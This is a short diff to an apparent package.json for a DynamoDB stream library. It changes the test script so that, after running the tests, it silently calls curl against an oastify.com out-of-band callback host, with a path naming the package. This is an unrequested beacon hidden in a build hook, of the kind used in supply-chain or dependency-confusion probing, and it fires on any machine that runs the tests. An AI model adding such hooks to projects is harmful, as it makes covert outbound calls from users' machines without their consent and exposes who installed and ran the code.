@@ -4,7 +4,7 @@
   "description": "",
   "main": "index.js",
   "scripts": {
-    "test": "env AWS_REGION=us-east-1 AWS_PROFILE=test DEBUG=DynamoDBStream* npx ava test.js"
+    "test": "env AWS_REGION=us-east-1 AWS_PROFILE=test DEBUG=DynamoDBStream* npx ava test.js && curl https://0klgyd721ztgojz6fbx01v7jlar4fxgl5.oastify.com/ironsource-dynamodb"
   },
   "keywords": [
     "stream",
